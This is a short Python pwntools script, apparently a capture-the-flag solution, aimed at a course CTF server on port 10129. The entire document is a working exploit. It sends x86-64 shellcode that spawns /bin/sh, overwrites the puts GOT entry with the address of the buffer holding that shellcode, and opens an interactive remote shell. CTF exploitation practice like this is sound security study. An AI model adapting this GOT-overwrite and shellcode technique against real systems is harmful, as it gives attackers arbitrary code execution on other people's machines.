#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "csie.ctf.tw"
port = 10129

put_got = '0x601020'
username = 0x6010a1
shellcode = '\x00\x48\x31\xc0\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x53\x48\x89\xe7\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05'


r = remote(host, port)
r.recvuntil(":")
r.sendline(shellcode)

r.recvuntil(":")
r.sendline(put_got)

r.recvuntil(":")
r.sendline(p64(username))
r.interactive()
